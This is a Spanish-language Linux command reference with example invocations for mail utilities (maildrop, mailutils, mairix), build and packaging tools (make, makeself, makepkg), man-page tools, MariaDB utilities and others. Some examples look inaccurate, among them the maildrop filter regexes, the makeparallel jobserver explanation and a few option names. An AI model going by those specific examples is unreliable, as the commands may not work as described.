$ edit documento.txt (si mailcap tiene "text/plain; nano %s; edit", abrirá nano para editar el archivo)
$ print informe.pdf (si mailcap tiene "application/pdf; evince -p %s; print", usará evince para imprimir)
$ print nota.txt (podría ejecutar "lpr %s" directamente)
$ run-mailcap --action=view imagen.jpg (según lo que conste en el archivo de configuración se abrirá con feh, imagemagic...)
$ see imagen.png


mailcheck
Herramienta que permite comprobar la existencia de nuevos mensajes en varios buzones tipo mbox y de tipo maildir, lo que garantiza la compatibilidad con la mayoría de los agentes de transporte de correo. También admite buzones remotos POP3 e IMAP.
$ mailcheck /var/mail/usuario (imprimirá si tienes mensajes nuevos en ese archivo mbox)
$ mailcheck /var/mail/usuario /home/usuario/mail/INBOX (comprobar varios buzones locales)
$ mailcheck ~/Maildir (comprobar un buzón local tipo maildir)
$ mailcheck imap://usuario:contraseña@imap.ejemplo.com/INBOX (comprobará la bandeja de entrada vía IMAP usando el usuario y la contraseña)
$ mailcheck pop3://usuario:contraseña@pop3.ejemplo.com (comprobar correo remoto vía POP3)


maildir-utils
Conjunto de utilidades para gestionar directorios de correo, específicamente la indexación y la búsqueda.
$ mu index (escanea recursivamente una colección de mensajes de correo electrónico y almacena la información encontrada en una base de datos)
$ mu find (busca mensajes según criterios de búsqueda)
$ mu mkdir (crea un nuevo directorio de correo)
$ mu add (añade mensajes específicos a la base de datos)
$ mu cfind (busca contactos)
$ mu extract (extrae archivos adjuntos y otros componentes MIME)
$ mu info (muestra información sobre la base de datos mu)
$ mu init (inicializa la base de datos mu)
$ mu remove (eliminar mensajes específicos de la base de datos)
$ mu server (iniciar un proceso de servidor para uso interno de mu4e)
$ mu view (ver un mensaje específico)


maildirsync
Utilidad para sincronizar carpetas de Maildir entre ordenadores utilizando su propio protocolo que permite transferir solo los cambios necesarios, lo que hace que la sincronización sea eficiente y rápida y SSH como transporte.
$ maildirsync /local/maildir1:/remote/maildir2 (sincronizar carpetas local y remota)
$ ssh user@remote_host "maildirsync /local/maildir1:/remote/maildir2" (sincronizar con un sistemas remotos con SSH)
$ maildirsync --only-read /local/maildir1:/remote/maildir2 (sincronizar solo los mensajes marcados como leídos [read])
$ maildirsync --exclude=/.Trash /local/maildir1:/remote/maildir2 (excluir ciertos directorios durante la sincronización)
$ maildirsync --verbose /local/maildir1:/remote/maildir2 (mostrar información detallada sobre la sincronización)
Nota.- No funciona con otros formatos de correo electrónico como mbox o IMAP.


maildrop
Es un agente de entrega de correo (MDA) que lee un mensaje de correo electrónico desde la entrada estándar y lo entrega a un buzón. Es particularmente útil para filtrar, clasificar y procesar correos antes de que lleguen a la bandeja de entrada, lo que te permite organizar el correo de forma automática y eficiente. Maildrop puede entregar correo tanto en formato mbox como maildir. Incluye las herramientas lockmail.maildrop, mailbot, maildirkw.maildrop, maildirmake.maildrop, maildirwatch, maildrop, makedat.maildrop, makedatprog, makemime, reformail, reformime y deliverquota.maildrop.
Maildrop utiliza un archivo de reglas, similar a un script, para determinar qué hacer con los mensajes entrantes.
$ maildrop -d usuario (lee un mensaje de correo desde la entrada estándar y lo entrega a un buzón. Si no se especifica en las reglas, al buzón predeterminado $HOME/Maildir)
$ echo "Subject: Prueba\n\nEste es un correo de prueba" | maildrop -d usuario (Esto entrega un correo de prueba al buzón predeterminado del usuario usuario)
$ lockmail /var/mail/usuario maildrop -d usuario (archivo o directorio donde se aplicará el bloqueo y comando a ejecutar mientras el buzón está bloqueado)
$ mailbot -T reply -t archivo_respuesta -d base_datos -A 'From: correo@dominio.com' sendmail (respuesta automática, archivo con el contenido de la respuesta, base de datos, cabecera adicional para la respuesta y programa para enviar el correo )
$ echo "Subject: Mensaje recibido\n\nGracias por tu correo." | mailbot -T reply -t /usr/share/auto_reply.txt -d autoresponsedb -A 'From: yo@dominio.com' /usr/sbin/sendmail -t (envía una respuesta automática al remitente del correo recibido, usando el contenido de /usr/share/auto_reply.txt)
$ maildirkw $HOME/Maildir/IN.Important add importante (directorio donde se gestionan las palabras clave, acción [puede ser "add", "remove" o "list"] y añade "importante" a palabras clave)
$ maildirmake -q 1000000S -f IN.Archivados $HOME/Maildir (crea un directorio maildir con una cuota de 1MB y la subcarpeta IN.Archivados)
$ maildirwatch $HOME/Maildir (monitorea un directorio maildir para detectar cambios)
$ makedat autoresponsedb (crea una base de datos GDBM para almacenar información, como registros de mensajes enviados o deduplicación)
$ makedat -db base_datos (lo mismo con una base de datos Berkeley DB)
$ makedatprog autoresponsedb (compila una base de datos autoresponsedb para uso con otras herramientas de maildrop)
$ makemime -c "text/plain" -f mensaje.txt -o correo.mime (crea un mensaje MIME a partir de mensaje.txt y lo guarda en correo.mime)
$ echo "Subject: Prueba\n\nMensaje" | reformail -f0 | maildrop -d usuario (Elimina líneas "From_" no válidas y entrega el mensaje al buzón de usuario)
$ reformail -D 8000 duplicate.cache (si el mensaje ya está en duplicate.cache, reformail devuelve un código de salida 0, indicando un duplicado)
$ reformime -e -s 1.1 < correo.mime > parte_extraida.txt (extrae la parte 1.1 de un mensaje MIME y la guarda en parte_extraida.txt)
$ echo "Subject: Prueba\n\nMensaje con cuota" | deliverquota $HOME/Maildir (entrega el mensaje a $HOME/Maildir, respetando cualquier cuota configurada)
Ejemplo de reglas básica de configuración
$ nano ~/.maildrop
        # Si el asunto del correo contiene la palabra "Spam" lo mueve a la carpeta Spam
        if (/^Subject:.*[Spam]/)
        {
            to "$HOME/Maildir/.Spam"
        }
        # Busca una cabecera List-Id en el correo. Si encuentra el valor especificado,
        # entrega el mensaje a la carpeta dev-team.
        if (/^List-Id:.*<dev-team.example.com>/)
        {
            to "$HOME/Maildir/.listas/dev-team"
        }
        # Si el correo proviene de spammer@example.com, lo elimina
        if (/^From:.*spammer@example.com/)
        {
            # elimina el correo
            exit
        }
        # Mover el correo con score de spam alto a la carpeta Spam
        if (/^X-Spam-Score:.*[5-9]|1[0-9]/)
        {
            to "$HOME/Maildir/.Spam"
        }
        # Reenviar el correo a 'otro-usuario@example.com'. Con reformail modifica el correo
        # y lo pasa a sendmail para reenviarlo.
        if (/^Subject:.*[Reenviar]/)
        {
            to "| /usr/bin/reformail -i $HOME/.forward | /usr/sbin/sendmail otro-usuario@example.com"
        }
        # Usar mailbot para enviar una respuesta automática
        if (/^Subject:.*[Consulta]/)
        {
            to "| /usr/bin/mailbot -t -A -T -M 'Hola, hemos recibido su consulta y le responderemos en breve. Gracias.' -f 'no-reply@example.com' -- "


mailfilter
Utilidad que permite eliminar los mensajes no deseados sin tener que descargarlos al equipo local. Ofrece compatibilidad con una o varias cuentas POP3 y es especialmente útil para conexiones de acceso telefónico a través de módem, RDSI, etc. Solo soporta POP3.
Ejemplo de configuración
$ nano ~/.mailfilterrc
        server "pop3.tuservidor.com"
          username "usuario"
          password "contraseña"
          # Borra mensajes de ciertos remitentes
          delete "From:.*correo@ejemplo.com"
          delete "Subject:.*viagra"
          # Borra mensajes por tamaño
          delete-every >1000000
        server "pop3.otroservidor.com
          username "usuario"
          ...
delete "From:.*spam@spammer.com" borrará cualquier correo cuyo remitente coincida con esa expresión regular, "Subject:.*viagra" todos los que contengan la palabra mencionada en el encabezado y delete-every >1000000 borra los mensajes mayores de 1 MB
$ mailfilter (conecta a la(s) cuenta(s) POP3 configuradas, analiza los correos y elimina los que coincidan con las reglas antes de descargar nada al cliente de correo)


mailfromd
Demonio de filtrado de correo de propósito general que trabaja integrado con servidores de correo como Sendmail, Postfix o MeTA1, funcionando junto al sistema MTA [Mail Transfer Agent]. Permite filtrar tanto mensajes entrantes como salientes usando reglas complejas basadas en scripts definidos por el administrador. Se integra con el servidor mediante los protocolos Milter o PMilter y ofrece funcionalidades avanzadas como verificación del remitente [sender address verification], greylisting, whitelisting y control de tasa de envío, además de admitir un lenguaje para crear filtros personalizables.
# systemctl enable mailfromd


mailscripts
Colección de scripts para la gestión del correo electrónico en Debian. Incluye las herramientas email-extract-openpgp-certs, email-print-mime-structure, gmi2email, imap-dl, maildir-import-patch, mbox-extract-patch, mbox2maildir, mdmv, notmuch-extract-patch, notmuch-import-patch y notmuch-slurp-debbug.
$ email-extract-openpgp-certs archivo.mbox > certificados.txt (escanear un buzón de correo en formato mbox y extraer los certificados OpenPGP)
$ email-print-mime-structure mensaje.eml (ver la estructura MIME [Multipurpose Internet Mail Extensions] de un correo guardado en el archivo mensaje.eml)
$ mbox2maildir buzon.mbox mi_mail_dir (convierte un buzón del formato mbox, un solo archivo que contiene todos los mensajes, al formato Maildir, cada mensaje es un archivo separado en una jerarquía de directorios)
$ maildir-import-patch /ruta/maildir | git am (importar los parches de un directorio Maildir y aplicarlos y canalizar su salida al comando git am)
$ mbox-extract-patch buzon.mbox > parches_extraidos.patch (similar a la herramienta anterior, esta herramienta extrae parches de un archivo mbox)
$ gmi2email mi_documento.gmi > mi_correo.eml (convierte un documento Gemini, un protocolo de internet simple, a un formato de correo electrónico)
$ imap-dl --host imap.ejemplo.com --user usuario --pass "micontraseña" /ruta/donde/guardar/correos (descarga correos electrónicos de un servidor IMAP)
$ mdmv --all INBOX archive ( mover todos los correos nuevos de la bandeja de entrada a una carpeta de archivo)
$ notmuch-import-patch < un_parche.patch (importar un parche a la base de datos de Notmuch)


mailtextbody
Herramienta que extrae el cuerpo de texto de mensajes de correo electrónico, manejando tanto mensajes simples como complejos con múltiples partes MIME.
$ mailtextbody < mensaje.eml (extraer texto de un correo simple)
$ cat mensaje.eml | mailtextbody (desde un archivo)
$ mailtextbody -t text/html < mensaje.eml (extraer solo texto/html)
$ mailtextbody -t text/plain < mensaje_con_html.eml (extraer texto/plain, por defecto)
$ mailtextbody < mensaje.eml > cuerpo_del_mensaje.txt (guardar en archivo)
$ mailtextbody < mensaje.eml | grep -i "urgente" (buscar palabras específicas)


mailutils
Colección de utilidades para gestionar y manipular correo electrónico independiente del protocolo de correo [POP3, IMAP, mbox, Maildir, MH, etc.]. Contiene las herramientas dotlock, frm, from, mail, messages, mimeview, movemail, readmsg y sieve.
$ echo "Hola, esto es un mensaje de prueba" | mail -s "Asunto" usuario@dominio.com (enviar un correo)
$ mail (leer correos nuevos. Dentro del programa, se puede usar comandos como ? para ayuda, d para borrar, q para salir, etc.)
$ from (muestra el remitente de los mensajes nuevos en el buzón)
$ frm (lista los mensajes del buzón mostrando remitente y asunto)
$ messages (cuenta el número de mensajes nuevos en el buzón)
$ readmsg +1 (muestra el primer mensaje del buzón)
$ movemail /var/mail/usuario /home/usuario/backup.mbox (mueve los mensajes del buzón del sistema a un archivo local)
$ dotlock /var/mail/usuario (bloquea un archivo de buzón. Devuelve 0 si el bloqueo fue exitoso)
$ mimeview -a /var/mail/usuario (muestra el contenido y estructura MIME del buzón)
$ sieve -u usuario -a script.sieve (filtra mensajes usando el lenguaje de filtrado Sieve)
Configuración básica con la información del servidor de correo y credenciales si es necesario.
$ nano ~/.mailrc
        set from=tu_correo@dominio.com
        set smtp=smtp.dominio.com
        set smtp-auth-user=tu_usuario
        set smtp-auth-password=tu_contraseña
        set smtp-auth=login


mailx
Programa para enviar y recibir correo (versión mejorada de 'mail' en Unix).
	$ mailx -s "pruebas" usuario@gmail.com
	Cc otro_correo@gmail.com
	Cuerpo del texto del correo
Ctrl D (para envio)
$ mailx -s "un adjunto" usuario@gmail.com < texto_para_enviar.txt (enviar un adjunto)


maim
[MAke IMage] toma capturas de pantalla del escritorio.
$ maim imagen.png (toma imagen del escritorio y la guarda en imagen.png)
$ maim -u -d 4 -f jpeg imagen (imagen si mostrar el cursor, 4 segundos de retardo, y guardar "imagen" en jpeg)
$ maim ~/Images/$(date +"%A,%d-%m-%Y").png (guardar la imagen en el directorio Images y con nombre con el formato de fecha especificado)
$ maim -s -f png -d 3 imagen (el cursor de convierte en cruz para seleccionar un trozo de pantalla, en formato png, esperar 3 segundos despues de terminar la seleción y guardar en imagen)


maint-guide
Este paquete contiene la Guía para nuevos mantenedores de Debian. Este documento intenta describir la construcción de un paquete Debian para usuarios comunes y potenciales de Debian. Utiliza un lenguaje bastante no técnico y está bien cubierto con ejemplos prácticos. En el navegador abrir la url /usr/share/doc/maint-guide-ca/html/index.ca.html


mairix
Programa para indexar y buscar mensajes de correo electrónico almacenados sin conexión en el ordenador. Crea primero un índice con el contenido de los correos electrónicos para hacer las búsquedas posteriores mucho más rápidas. Trabaja directamente sobre los archivos locales de correo, por lo que es especialmente útil para quienes gestionan sus correos offline usando clientes como mutt, neomutt, o similares.
$ mairix (escaneará los correos y creará el índice)
$ mairix f:ejemplo@correo.com (buscar todos los mensajes enviados por una persona)
$ mairix s:factura (buscar todos los correos que en el asunto contienen la palabra “factura”)
$ mairix b:reunión (buscar todos los mensajes que contengan la palabra "reunión" en el cuerpo del mensaje)
$ mairix d:2025-08-01..2025-08-15 (buscar mensajes recibidos entre el 1 y el 15 de agosto de 2025. Formato YYYY-MM-DD)
$ mairix f:ana@dominio.com d:2024-06-01..2024-06-30 s:informe (encontrar todos los correos enviados por ana@dominio.com durante junio de 2024 cuyo asunto contiene informe)
Ejemplo de archivo de configuración
$ nano ~/.mairixrc
        # Directorio base donde se almacenan los correos
        base=/home/usuario/Mail
        # Los directorios de correo a indexar (pueden ser varios)
        maildir=Inbox
        maildir=Sent
        maildir=Archive/2023
        # Formato del maildir; usar maildir para el formato Maildir, mbox si es mbox tradicional
        maildir_type=maildir
        # Carpeta donde se guardarán los resultados de las búsquedas
        database=/home/usuario/.mairix_db
        # Carpeta donde se mostrarán los resultados como symlinks a los mails reales
        results=Results
        # Patrón de fecha para indexar solo correos a partir de 2023
        from=2023
        # Se puede añadir más patrones según necesidades
        # Por ejemplo, para solo indexar correos con un determinado "From"
        pattern=from:ejemplo@dominio.com
        # Excluir carpetas que no se quiere indexar (opcional)
        not_maildir=Spam
        not_maildir=Trash
base --> Directorio raíz con las carpetas de correo.
maildir --> Lista cada carpeta de correo a indexar. Se pueden poner tantas líneas como se necesiten.
maildir_type --> Define el formato, generalmente maildir.
results --> Carpeta donde mairix crea enlaces simbólicos a los correos encontrados.
from --> Restringe el filtrado por fecha mínima al indexar [opcional].
not_maildir --> Carpeta(s) de correo a excluir del índice [opcional].


make
[Ver compilar]. Herramienta que automatiza la compilación y construcción de archivos ejecutables a partir del código fuente, siguiendo las reglas definidas en el archivo makefile en el directorio actual.
Un ejemplo podría ser:
$ nano HolaMundo.c
#include <stdio.h>
int main(){ printf("Hola mundo\n"); return 0; }
$ nano makefile
HolaMundo: HolaMundo.c
	gcc -o HolaMundo HolaMundo.c
$ make (Generará el ejecutable HolaMundo)
$ ./HolaMundo (lanzar el ejecutable)


makedumpfile
Herramienta para crear imágenes de volcado de memoria [memory dumps] optimizados, eliminando información innecesaria como páginas de memoria libre, caché, etc, especialmente en escenarios de análisis de fallos del sistema como crash dumps del kernel. Se utiliza comúnmente junto con kdump [ver], el mecanismo de volcado de memoria del kernel en Linux. y obtiene los datos de /proc/vmcore, generado después de un kernel panic cuando kdump está activado y /dev/mem acceso directo a la memoria física, menos común hoy por razones de seguridad.
# makedumpfile -c -d 31 /proc/vmcore /var/crash/dumpfile.20250405 (comprime el volcado usando zlib, páginas a excluir, volcado completo del kernel y archivo de salida)
# makedumpfile -c -d 31 --encrypt --keyfile /etc/dumpkey /proc/vmcore /var/crash/secure_dump (Crear un volcado con encriptación especificando el archivo con la clave)
La clave con 16 bytes se puede generar:
$ dd if=/dev/urandom of=/etc/dumpkey bs=1 count=16
Las opciones de filtrado de las páginas a excluir [-d] se basa en la siguiente numeración:
1 -->  Páginas libres
2 -->  Páginas de caché de archivo
4 -->  Páginas de caché de slab
8 -->  Páginas de usuarios no presentes
16-->  Páginas de kernel no presentes
Sumar para combinar exclusiones:
1+2+4+8+16=31 --> [-d 31] excluye todo lo anterior.
8+16=24 --> [-d 24] excluye usuarios y kernel no presentes.
1+2+4=7 --> [-d 7] excluye páginas libres, caché y slab.
$ crash /usr/lib/debug/boot/vmlinux-$(uname -r) /var/crash/dumpfile.20250405 (analizar un volcado existente. Ver crash)


makefs
Herramienta utilizada para crear imágenes de sistemas de archivos a partir de un árbol de directorios existente. El uso más común es para crear imágenes de sistemas de archivos de tipo CD9660, también conocido como ISO 9660, que es el estándar para discos compactos de datos y para crear imágenes de sistemas de archivos FFS  [Fast File System], un sistema de archivos tradicional de Unix.
$ makefs -t cd9660 proyecto.iso proyecto/ (creará el archivo mi_proyecto.iso, que es una imagen de disco con formato CD9660. Esta imagen ya está lista para ser grabada en un CD o montada como un disco virtual)
$ makefs -t ffs -s 512M mi_ffs_disco.img mi_directorio (crear una imagen de un sistema de archivos FFS para usarla como un disco virtual en una máquina virtual con un tamaño de la imagen en 512 Megabytes)


makeinfo
Compilar archivos texinfo a distintos formatos.
$ makeinfo --html archivo.texi (a html)
$ makeinfo --pdf archivo.texi


makeparallel
Utilidad diseñada para optimizar la ejecución de tareas en paralelo con GNU make, especialmente en entornos donde varios procesos de compilación o construcción pueden competir por recursos. Su función principal es coordinar el número de trabajos paralelos [-j] que cada instancia de make puede ejecutar, evitando la sobrecarga del sistema y mejorando la eficiencia.
$ make --jobserver-auth=3,4 -j4 (un proyecto con varios subdirectorios, cada uno con su propio Makefile, para compilarlo todo en paralelo, pero sin saturar la CPU, crea un servidor de trabajos que permite hasta 4 trabajos en paralelo)
$ makeparallel --jobserver-auth=3,4 make (en cada subdirectorio, en lugar de ejecutar make -j4, makeparallel se comunicará con el servidor de trabajos, reclamará los disponibles y ejecutará make con el número de trabajos asignados)
Ejemplo práctico con un propyecto con la estructura:
proyecto/
├── Makefile
├── modulo1/
│   └── Makefile
├── modulo2/
│   └── Makefile
└── modulo3/
    └── Makefile
Compilar todo en paralelo, pero sin exceder 4 trabajos en total. Primer paso iniciar el servidor de trabajos
$ make --jobserver-auth=3,4 -j4
A continuación compilar cada módulo
$ cd modulo1 && makeparallel --jobserver-auth=3,4 make
$ cd modulo2 && makeparallel --jobserver-auth=3,4 make
$ cd modulo3 && makeparallel --jobserver-auth=3,4 make
Cada makeparallel reclamará trabajos disponibles y ejecutará make con el número de trabajos asignados, sin exceder el límite global de 4.


makepasswd
Crea contraseñas aleatorias usando /dev/urandom.
$ makepasswd --count=5 --chars=12 (5 y de 12 caracteres)
$ makepasswd --count=5 --chars=12 --count=5 --crypt (y cifrar el resultado de cada una de ellas. Otra opcion es crypt-md5)


makepatch
Se utiliza para crear un archivo de parche [patch] que representa las diferencias entre dos árboles de código fuente. Es una herramienta muy útil para compartir cambios específicos sin tener que distribuir todo el repositorio. La herramienta applypatch, incluida en el comando, es la contraparte de makepatch y se encarga de aplicar ese archivo de parche a otro árbol de código fuente.
Un ejemplo para ilustrar su uso
Supongamos que tenemos una versión original de un proyecto llamada proyecto-v1 y hemos creado una versión modificada llamada proyecto-v2.
$ makepatch proyecto-v1 proyecto-v2 > mis-cambios.patch (crear el archivo de parche que contiene las diferencias entre proyecto-v1 y proyecto-v2)
Si en otro equipo se tiene la versión original del proyecto y, estando en el mismo directorio del proyecto, se quiere aplicar los cambios:
$ applypatch mis-cambios.patch (aplicar los cambios en el otro equipo para que sean idénticos a los del árbol de código fuente proyecto-v2 del primer equipo)
makepatch crea el parche y applypatch lo aplica, facilitando la gestión de cambios en el código de forma incremental.


makepkg
Script para automatizar la construcción de paquetes para Archlinux.
# makepkg --asroot (Lanzado en el interior del directorio donde se encuentra el PKGBUILD, crea el paquete .pkg.tar.xz, instalable con pacman -U)
# makepkg --asroot --source (Lanzado en el interior del directorio donde se encuentra al PKGBUILD, crea el paquete .src.tar.gz listo para subir a AUR)
# makepkg --asroot -g paquete (Muestra el md5sum)


makeself
Herramienta de empaquetado que permite crear archivos autoextraíbles en sistemas Unix/Linux. Estos archivos son scripts de shell ejecutables que contienen en su interior un directorio comprimido como un archivo .tar.gz, .tar.bz2, etc. más un pequeño código que permite descomprimir automáticamente el contenido en un directorio temporal, ejecutar un comando [por ejemplo, ./install.sh] y eliminar los archivos temporales al finalizar.
Ilustrar el comando con un ejemplo de guardar el directorio y subdirectorios ~/Docs/bash y que cuando se descomprima que ejecute el script mis_docs.sh.
$ nano mis_docs.sh
        #!/bin/bash
        echo "documentos guardados"
$ makeself --bzip2 --notemp ~/docs/bash/ ~/pruebas/bash.run "documentos bash" ~/bin/mis_docs.sh (creará el ejecutable bash.run en ~/pruebas y en su interior el directorio bash/ comprimido en bzip2, sin eliminar los archivos temporales, con el título especificado y el ejecutable mis_docs.sh)
        ...
        CRC: 2686987911
        MD5: e7250a45419e2cb52bc200b674314b56
        Self-extractable archive "/home/pep/pruebas/bash.run" successfully created.
Nota.- Si no se especifican rutas absolutas tanto el directorio que se comprime, el script.sh que se ejecuta cuando se descomprime y el resultdo .run, todo tiene que estar o aparece en el directorio activo.
$ chmod +x bash.run (permiso de ejecución)
$ ~/pruebas/bash.run --target /tmp/extracted --noexec (Para ver el contenido en /tmp/extracted)
        Creating directory /tmp/extracted
        Verifying archive integrity...  100%   MD5 checksums are OK. All good.
        Uncompressing documentos bash 100%
$ ./bash.run (Al ejecutar se creará el arbol de directorios que se creó originalmente en el propio directorio o en el equipo donde se copie el .run)
        Creating directory bash
        Verifying archive integrity...  100%   MD5 checksums are OK. All good.
        Uncompressing documents de bash per guardar  100%
        documentos guardados
        $


makexvpics
Herramienta específica para crear y actualizar miniaturas [thumbnails] compatibles con los visores XV, zgv y xzgv. Estas miniaturas son incompatibles** con los formatos usados por GNOME [Nautilus] y KDE [Konqueror], que requieren sus propias herramientas. Incluye la aplicación ppmtoxvmini es un programa que convierte archivos PPM sin procesar al formato especial utilizado por xv, zgv y otras herramientas. Según la descripción de debian, no debe ejecutarse directamente y en su lugar, utilizar la herramienta makexvpics.
$ makexvpics -f -v imagenes/* (crea miniaturas para todas las imágenes en el directorio especificado y las almacena en imagenes/.xvpics)
$ makexvpics -f -v imagen.jpg (fuerza la creación de la minuatura, muestra información y la almacena en el directorio .xvpics)
Nota.- Para visualizarlas con la aplicación feh o imagemagic


maldet
Detector de malware.
# maldet -a /home/usuario
# maldet -m /home/user1,/home/user2
# maldet -u (Acualización de firmas de detección de malware desde rfxn.com)
# maldet –report (Muestra el último reporte)


man
Muestra la página del manual de un comando o aplicación.
$ man -L es comando (especificando idioma si disponible)
$ man -k permissions (Busca comandos que traten sobre “permissions”)
$ man -k vnc ssh (Buscar sobre dos comandos)
$ man -t ls > ls.pdf (Formateado para salida pdf)
$ man -t ls | ps2pdf -&gt; /home/usuario/ls.pdf (Lo mismo)
$ man 2 read (Especificando la sección del manual. Por defecto la 1)
Secciones:
Sección 1: Comandos generales
Sección 2: Llamadas a sistema
Sección 3: Funciones (programación en C)
Sección 4: Ficheros especiales
Sección 5: Formatos de fichero y convenciones
Sección 6: Juegos
Sección 7: Convenciones y otros
Sección 8: Comandos privilegiados y de administración
Algunas teclas de control:
	Ctrl + f (Avanza una página)
	Crrl + b (Retrocede una página)
	/palabra (Busca “palabra” en el texto hacia adelante)
	?palabra (Busca “palabra” en el texto hacia atrás)
	n (Elemento siguiente en la busqueda)
	N (Elemento previo en la busqueda)
	q (Salir)
Nota.- Normalmente "man" formatea el contenido para que coincida con el ancho del terminal. Redirige su salida a una tubería, que no tiene "ancho de pantalla", por lo tanto, formatea utilizando el ancho predeterminado de 80 caracteres. Algunas páginas de manual tienen tablas de más de 80 caracteres de ancho, por lo que aparece esta advertencia de "no se puede romper la línea".
        <standard input>:602: warning [p 7, 11.3i, div 'an-div', 0.2i]: cannot adjust line
Para solucionarlo:
        $ MANWIDTH=1250 man $COMANDO | wc -l
1.-
Para crear una página man a partir de un .md:
$ pandoc archivo.md -s -t man -o archivo.1
# mv archivo.1 /usr/local/share/man/ca/man1/ (si no estan los directorios "ca/man1" se crean)


man2html
Explorar las páginas del manual en el navegador con la dirección http://localhost/cgi-bin/man/man2html. Es necesario habilitar la compatibilidad con CGI en el servidor HTTP [CGI puede estar deshabilitado por defecto por motivos de seguridad]. Para Apache2, se puede habilitar con:
# a2enmod cgid
# systemctl restart apache2


man-db
Gestion de las páginas man.
$ mandb (actualizar la base de datos)
$ mandb -d (mostrando la máxima información)
$ mandb -t (comprobaciones de corrección en las páginas del manual en la ruta de búsqueda jerárquica)


man2web
Pasar páginas del manual a formato html.
$ man2web ifconfig > ifconfig.html


mandoc
[manual document]. Conjunto de herramientas para procesar y mostrar páginas de manual en los formatos de macro mdoc y man, ampliamente usados en sistemas BSD y UNIX. Además el conjunto de herramientas incluye varias utilidades complementarias para buscar, indexar y manipular estas páginas. Incluye las aplicaciones demandoc, mapropos, mman, msoelim, mwhatis, makewhatis, mandocd y mcatman
$ mandoc /usr/share/man/man1/ls.1 (procesar una página de manual y verla en el terminal)
$ demandoc /usr/share/man/man1/ls.1 (convierte una página de manual a texto plano, eliminando todo el formato)
$ mapropos disk (buscar comandos relacionados con "disk")
$ mman ls (ver las páginas de manual utilizando la base de datos de mandoc. Reemplaza a man en entornos configurados para usar mandoc)
$ msoelim /usr/share/man/man1/ls.1 (procesar una página de manual que incluye macros .so que suelen ser referencias a otras partes del manual)
$ mwhatis ls (ver descripción exacta del comando ls)


manpage-alert
Comprobar ejecutables sin página de manual.
$ manpage-alert -p (por su nombre)
$ manpage-alert -f (sin texto principal)


manpages-es
Este paquete contiene páginas de manual traducidas al español. Las traducciones exactas y las páginas del manual pueden cambiar de una versión a otra de un comando a una app, por tanto pueden no corresponder a la versión actual. El paquete contienen páginas de manual adicionales que aún no se han traducido.


manpath
Busca la ruta de las páginas man.
$ manpath -g (todas las rutas globales dentro del archivo de configuración)


manswitch
Busca un flag concreto en las páginas man.
$ manswitch ps -a
$ manswitch uname -r


mapscii
google maps en la terminal. Descargar node de <https://nodejs.org/en/> y una vez descomprimido colocarlo en opt, crear un enlace a su ejecutable e instalar el paquete:
	# mv node-v6.10.3-linux-x64 /opt
	# ln -s /opt/node-v6.10.3-linux-x64/bin/npm /usr/bin/
	# npm install -g mapscii
$ mapscii (abre el mapa mundial)
Teclas:
	las flechas (para mover derecha, izquierda, arriba y abajo)
	a (Acercar el zoom)
	z (alejar el zoom)
Nota.- Tambien puede ejecutarse en una terminal sin instalar nada tecleando: telnet mapscii.me y usando las mismas teclas.


mariadb-backup
Herramienta de copia de seguridad para el servidor MariaDB.
$ mariadb-backup --backup --target-dir=/var/mariadb/backup/ --user=mariadb-backup --password=mypassword  (que realice una copia de seguridad, dónde colocarla y los datos el usuario)
$ mariadb-backup --prepare --target-dir=/var/mariadb/backup/ (Antes de restaurar desde una copia de seguridad, primero preparar para que los archivos de datos sean consistentes)
$ mariadb-backup --copy-back --target-dir=/var/mariadb/backup/ (restaurar la copia de seguridad conservando los archivos de copia de seguridad originales)
$ mariadb-backup --move-back --target-dir=/var/mariadb/backup/ (restaurar la copia de seguridad sin conservar los archivos de copia de seguridad originales)
Nota.- Antes de restaurar, detener el proceso del servidor MariaDB y asegurarse de que el directorio de datos está vacío.
$ chown -R mysql:mysql /var/lib/mysql/ (después de restaurar una copia de seguridad, podría ser necesario ajustar el propietario del directorio de datos para que coincida con el usuario y el grupo del servidor MariaDB)


mariadb-client
[mariadb-server]. Utilidad para gestionar el cliente y el servidor de bases de datos MariaDB. MariaDB es un servidor de bases de datos SQL [Structured Query Language] compatible con MySQL, rápido, estable y multiusuario con múltiples subprocesos.
# systemctl enable mariadb (activar el servicio en el servidor)
# mysql_secure_installation (permite fijar contraseñas, eliminar usuarios anónimos y bloquear accesos inseguros)
# mysql -u usuario -p (conectarse al servidor local o remoto tras ingresar la contraseña, aparecerá el prompt de MariaDB para ejecutar comandos SQL)
> show databases; (listar bases de datos)
> use mibasedatos (seleccioanr una base de datos)
> show tables (listar tablas de la base de datos seleccionada)
> describe mitabla (ver estructura de una tabla)


mariadb-test
[mariadb-test-data]. Conjunto de pruebas de regresión de bases de datos MariaDB. Estas pruebas están diseñadas para verificar que el servidor MariaDB funcione correctamente y no se han roto funcionalidades, después de cambios en el código, actualizaciones, parches o configuraciones específicas. Incluye las herramientas mariadb-client-test, mariadb-client-test-embedded, mariadb-test [=mysqltest], mariadb-test-embedded, mysql_client_test, mysql_client_test_embedded, mysqltest_embedded y test-connect-t y en el directorio /usr/share/mariadb-test o /usr/share/mariadb/mariadb-test/, según versiones, se encuentran test de pruebas.
$ cd /usr/share/mariadb/mariadb-test/
# ./mysql-test-run.pl (forma más recomendada de ejecutar la suite de pruebas de regresión completa)
# ./mariadb-stress-test.pl --threads=10 --queries=1000 (pruebas de carga y estrés. Iniciaría un test de estrés con 10 hilos simultáneos y ejecutaría 1000 consultas)
# ./mysql-test-run.pl --suite=innodb (solo probar las pruebas relacionadas con el motor InnoDB)
# ./mysql-test-run.pl main.alter_table (probar solo un archivo de prueba específico)
# ./mysql-test-run.pl --test-file=rpl.test (probar una funcionalidad concreta)
Después de ejecutar las pruebas, el resumen con el número de pruebas pasadas/fallidas se encuentran en el directorio /usr/share/mysql/mysql-test/


marisa
[Matching Algorithm with Recursively Implemented StorAge]. Utilidades** que sirven para interactuar con la librería libmarisa. Esa librería implementa un trie comprimido y estático, muy usado en búsquedas rápidas de cadenas, diccionarios y autocompletado. Un trie es una estructura de datos tipo árbol diseñada para manejar colecciones de cadenas y marisa es una implementación optimizada de tries muy usado, por ejemplo, en motores de búsqueda, correctores ortográficos, autocompletado y análisis de texto. Incluye las herramientas marisa-benchmark, marisa-build, marisa-common-prefix-search, marisa-dump, marisa-lookup, marisa-predictive-search y marisa-reverse-lookup.
Un ejemplo sería guardar "casa", "caso" y "canto". En un array normal ocuparía memoria redundante, pero en un trie se comparte prefijos con la estructura siguiente:
        c
         └─ a
             └─ s
             │   ├─ a
             │   └─ o
             └─ n
                 └─ t
                     └─ o
Así, es mucho más eficiente en memoria y en búsqueda de prefijos.
